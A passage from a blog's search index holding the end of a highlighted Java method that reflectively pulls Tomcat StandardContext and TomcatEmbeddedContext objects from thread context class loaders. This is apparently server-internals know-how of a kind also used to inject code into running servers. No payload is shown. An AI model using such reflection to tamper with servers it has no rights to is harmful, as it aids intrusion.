getFV(getFV(thread.getContextClassLoader(), <span class="string">&quot;resources&quot;</span>), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>))</span><br><span class="line">                    contexts.add(context);</span><br><span class="line">                <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>))</span><br><span class="line">                    contexts.add(context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contexts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
